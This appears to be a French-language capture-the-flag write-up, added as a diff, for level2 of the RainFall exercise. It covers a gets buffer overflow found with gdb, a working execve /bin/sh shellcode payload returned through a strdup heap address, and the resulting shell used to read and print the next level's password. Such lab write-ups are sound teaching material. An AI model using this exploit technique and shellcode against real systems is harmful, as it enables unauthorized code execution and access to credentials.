@@ -1,0 +1,66 @@
+comme dans le level1 le binaire ouvre un stream nous permetant de prentre un output.
+
+ilevel2@RainFall:~$ ./level2
+test
+test
+
+Voir le disas_analys
+
+On vois plusieurs call de fonction dont gets, on va donc essayer de peter le buffer comme dans le level1
+
+level2@RainFall:~$ python -c 'print "o" * 76' > /tmp/run
+level2@RainFall:~$ gdb level2
+
+(gdb) r < /tmp/run
+Starting program: /home/user/level2/level2 < /tmp/run
+ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooJoooooooo
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00000000 in ?? ()
+(gdb) info register
+eax            0x804a008	134520840
+ecx            0x0	0
+edx            0xbffff6ac	-1073744212
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff708	0xbffff708
+ebp            0x8048550	0x8048550
+esi            0x0	0
+edi            0x0	0
+eip            0x0	0
+eflags         0x210282	[ SF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+
+eip est l'address de retour mais la elle nous donne 0x0
+
+L'address est et on le vois avec le cmp dans le main une fois disas.
+
+eax est par ailleurs appeller par strdup. Sachant que strdup utilise malloc, cela alloue de la memoire. On peut donc utiliser l'addresse de eax
+
+On convertie en little endian l'addresse retourner. 0x804a008 devient donc \x08\xa0\x04\x08 pour convertir en little endian les deux derniers chiffre devienent le premier carac et ainsi de suite ce qui nous donne bien \x08\xa0\x04\x08
+
+Cependant ce ne sera pas suffisant car ils nous faudra du shellcode. En effet a l'insta du level1 ils n'y a pas d'execussion du bash.
+
+Donc on en cherche une sur internet "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" trouve sur shellstorm
+Pour le coup on peut trouver beaucoup de shellcode sur internet ce qui faut savoir c'est que fait le shellcode et ca taille.
+
+Pour le coup celui la est de 24 et est = /bin/sh en gros
+
+python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "o" * 56 + "\x08\xa0\x04\x08"' > /tmp/run
+
+24 bytes de shellcodes
+4 bytes pour l'adresse
+56 bytes de char
+
+level2@RainFall:~$ python -c 'print "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "o" * 56 + "\x08\xa0\x04\x08"' > /tmp/run
+level2@RainFall:~$ cat /tmp/run - | ./level2
+1��Ph//shh/bin��PS��
+                     ̀oooooooooooooooooooooooooooooooooooooooooooooooooo�
+whoami
+level3
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
